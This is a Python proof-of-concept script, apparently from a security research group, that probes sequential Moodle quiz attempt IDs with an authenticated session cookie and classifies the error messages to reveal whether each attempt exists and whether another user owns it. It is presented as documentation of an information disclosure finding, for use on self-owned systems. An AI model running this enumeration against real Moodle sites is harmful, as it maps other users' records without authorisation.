"""
SCL-002 — Quiz Attempt Enumerator
SecChkLab Security Research

Purpose:
Probes sequential quiz attempt IDs against a Moodle instance
and classifies responses based on error message content.
Used to demonstrate the information disclosure finding where
different error messages reveal attempt existence and ownership.

Usage:
Set BASE_URL to your Moodle instance.
Set COOKIE to a valid authenticated session cookie.
Set CMID to the course module ID of the quiz being tested.
Run the script and observe how different IDs return
different responses revealing system state.

Note: Run only against systems you own and control.
This script is for educational and research documentation only.
"""

import urllib.request
import urllib.error

# Configuration
BASE_URL = "http://localhost/moodle"
CMID = 3
SESSION_COOKIE = "MoodleSession=your_session_token_here"
MAX_ATTEMPTS = 10

def check_attempt(attempt_id):
    url = f"{BASE_URL}/mod/quiz/review.php?attempt={attempt_id}&cmid={CMID}"
    
    request = urllib.request.Request(url)
    request.add_header("Cookie", SESSION_COOKIE)
    
    try:
        response = urllib.request.urlopen(request)
        content = response.read().decode('utf-8')
        
        if "This is not your attempt" in content:
            return "EXISTS — owned by another user"
        elif "no longer exists" in content:
            return "DOES NOT EXIST"
        elif "quiz" in content.lower():
            return "EXISTS — you own this attempt"
        else:
            return "UNKNOWN RESPONSE"
            
    except urllib.error.HTTPError as e:
        if e.code == 302:
            return "REDIRECT — likely login required"
        return f"HTTP ERROR {e.code}"
    except Exception as e:
        return f"ERROR — {str(e)}"

def main():
    print("=" * 60)
    print("SCL-002 — Quiz Attempt Enumerator")
    print("SecChkLab Security Research")
    print("=" * 60)
    print(f"Target: {BASE_URL}")
    print(f"Quiz CMID: {CMID}")
    print(f"Probing attempt IDs 1 through {MAX_ATTEMPTS}")
    print("=" * 60)
    
    results = {}
    
    for attempt_id in range(1, MAX_ATTEMPTS + 1):
        result = check_attempt(attempt_id)
        results[attempt_id] = result
        print(f"Attempt {attempt_id:3d}: {result}")
    
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    
    existing = [k for k, v in results.items() 
                if "EXISTS" in v]
    not_existing = [k for k, v in results.items() 
                    if "DOES NOT EXIST" in v]
    owned_by_others = [k for k, v in results.items() 
                       if "another user" in v]
    
    print(f"Total attempts probed:     {MAX_ATTEMPTS}")
    print(f"Existing attempts found:   {len(existing)} — IDs: {existing}")
    print(f"Owned by other users:      {len(owned_by_others)} — IDs: {owned_by_others}")
    print(f"Non-existent IDs:          {len(not_existing)}")
    print("\nFinding: Different error messages reveal attempt")
    print("existence and ownership without exposing content.")
    print("=" * 60)

if __name__ == "__main__":
    main()
